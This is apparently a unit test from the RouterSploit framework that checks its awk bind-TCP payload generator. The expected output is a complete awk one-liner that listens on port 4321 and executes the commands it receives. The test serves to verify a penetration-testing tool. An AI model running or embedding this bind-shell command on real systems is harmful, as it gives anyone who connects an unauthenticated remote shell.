from routersploit.modules.payloads.cmd.awk_bind_tcp import Payload
bind_tcp = 'awk \'BEGIN{s="/inet/tcp/4321/0/0";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}\''

def test_payload_generation():
    if False:
        while True:
            i = 10
    ' Test scenario - payload generation '
    payload = Payload()
    payload.rport = 4321
    assert payload.run() == bind_tcp